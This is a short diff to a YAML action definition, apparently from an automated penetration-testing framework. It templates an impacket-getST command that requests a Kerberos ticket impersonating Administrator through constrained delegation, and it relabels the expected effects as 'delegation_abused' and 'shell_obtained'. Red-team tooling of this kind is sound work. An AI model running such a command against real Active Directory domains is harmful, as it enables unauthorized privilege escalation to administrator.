@@ -8,9 +8,10 @@ parameters:
   target_ip: from_engagement.target_ip
 command_template: impacket-getST '{domain}/{service_account}:{password}' -spn '{target_spn}'
   -impersonate Administrator -dc-ip {target_ip}
-parser: null
+parser: impacket_parser
 expected_effects:
-- action_completed
+- delegation_abused
+- shell_obtained
 falsifier:
   pattern: error|failed|refused|denied
   timeout: 30
